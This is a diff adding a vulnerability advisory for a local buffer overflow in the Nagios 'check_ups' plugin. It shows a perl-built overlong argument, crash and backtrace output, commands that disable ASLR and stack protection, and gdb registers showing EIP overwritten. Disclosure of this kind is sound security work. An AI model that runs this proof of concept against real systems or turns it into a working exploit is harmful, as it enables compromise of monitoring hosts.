@@ -1,0 +1,74 @@
+#################################################################
+# Advisory:			Nagios Plugin 'check_ups' local buffer overflow
+# Author:				Stefan Schurtz
+# Contact:			s.schurtz@infoserve.de
+# Affected Software:		Successfully tested on nagios-plugins-1.4.15
+# Vendor URL:			http://nagiosplugins.org/
+#################################################################
+
+./check_ups -u `perl -e 'print "A"x16407'`
+*** buffer overflow detected ***: ./check_ups terminated
+======= Backtrace: =========
+/lib/libc.so.6(__fortify_fail+0x50)[0x25d970]
+/lib/libc.so.6(+0xe486a)[0x25c86a]
+/lib/libc.so.6(+0xe3fa8)[0x25bfa8]
+/lib/libc.so.6(_IO_default_xsputn+0x9e)[0x1e2a2e]
+/lib/libc.so.6(_IO_vfprintf+0x36b2)[0x1b88c2]
+/lib/libc.so.6(__vsprintf_chk+0xad)[0x25c05d]
+/lib/libc.so.6(__sprintf_chk+0x2d)[0x25bf9d]
+./check_ups[0x8049e66]
+./check_ups[0x804a105]
+./check_ups[0x804a4ce]
+/lib/libc.so.6(__libc_start_main+0xe7)[0x18ece7]
+./check_ups[0x80491a1]
+======= Memory map: ========
+00110000-0012c000 r-xp 00000000 08:01 660177     /lib/ld-2.12.1.so
+0012c000-0012d000 r--p 0001b000 08:01 660177     /lib/ld-2.12.1.so
+0012d000-0012e000 rw-p 0001c000 08:01 660177     /lib/ld-2.12.1.so
+0012e000-0012f000 r-xp 00000000 00:00 0          [vdso]
+0012f000-00142000 r-xp 00000000 08:01 660186     /lib/libnsl-2.12.1.so
+00142000-00143000 r--p 00012000 08:01 660186     /lib/libnsl-2.12.1.so
+00143000-00144000 rw-p 00013000 08:01 660186     /lib/libnsl-2.12.1.so
+00144000-00146000 rw-p 00000000 00:00 0
+
+// Compile without stack protection
+
+sysctl -w kernel.randomize_va_space=0
+
+cd plugins/
+
+gcc -fno-stack-protector -z execstack -DNP_VERSION=\"1.4.15\" -g -o check_ups check_ups.c netutils.o utils.o -L/usr/src/nagios-plugins-1.4.15/plugins ../lib/libnagiosplug.a ../gl/libgnu.a -DLOCALEDIR=\"/usr/local/nagios/share/locale\" -I../lib -I../gl -I../intl -I..
+
+// next test
+
+./check_ups -u `perl -e 'print "A"x16408'`
+Connection refused
+Invalid response received from host
+Segmentation fault
+
+(gdb) run -u `perl -e 'print "A"x16408'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /usr/src/nagios-plugins-1.4.15/plugins/check_ups -u `perl -e 'print "A"x16408'`
+Connection refused
+Invalid response received from host
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) i r
+eax            0xffffffff       -1
+ecx            0x2914e0 2692320
+edx            0x292360 2696032
+ebx            0x41414141       1094795585
+esp            0xbfff56f0       0xbfff56f0
+ebp            0x41414141       0x41414141 <--- AAAA
+esi            0x0      0
+edi            0x0      0
+eip            0x41414141       0x41414141 <--- AAAA
+eflags         0x10286  [ PF SF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
